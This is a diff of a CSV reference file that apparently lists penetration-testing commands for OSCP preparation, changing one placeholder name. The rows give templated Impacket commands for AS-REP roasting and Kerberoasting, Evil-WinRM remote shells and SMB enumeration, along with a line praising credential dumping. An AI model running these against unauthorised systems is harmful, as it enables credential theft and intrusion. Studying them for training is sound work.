@@ -1434,7 +1434,7 @@ This tool is the CORNERSTONE of post-exploitation credential harvesting in OSCP.
 Master DCSync, SAM dumping, and NTDS.dit extraction - you'll use them in EVERY Active Directory exam machine.","high"
 "getnpusers-asreproast","Impacket GetNPUsers - AS-REP Roasting","active-directory","impacket-GetNPUsers <DOMAIN>/ -usersfile <USERLIST> -dc-ip <DC_IP>","Extract AS-REP hashes for users without Kerberos pre-auth","kerberos-attacks","",""
 "getuserspns-kerberoast","Impacket GetUserSPNs - Kerberoasting","active-directory","impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request","Request service tickets for Kerberoastable accounts","kerberos-attacks","",""
-"evil-winrm-shell","Evil-WinRM - PowerShell Remoting","active-directory","evil-winrm -i <TARGET> -u <USER> -p <PASS>","Connect to Windows via WinRM for PowerShell access","lateral-movement","",""
+"evil-winrm-shell","Evil-WinRM - PowerShell Remoting","active-directory","evil-winrm -i <TARGET> -u <USER> -p <PASSWORD>","Connect to Windows via WinRM for PowerShell access","lateral-movement","",""
 "rpcclient-enum","RPCClient - Enumerate SMB","active-directory","rpcclient -U '<USER>%<PASS>' <TARGET>","Enumerate SMB/MSRPC information","enumeration","",""
 "smbclient-connect","SMBClient - Connect to Share","active-directory","smbclient //<TARGET>/<SHARE> -U <USER>","Connect to SMB share and browse files","enumeration","",""
 "smbmap-shares","SMBMap - Enumerate Shares","active-directory","smbmap -H <TARGET> -u <USER> -p <PASS>","Enumerate SMB shares and permissions","enumeration","",""
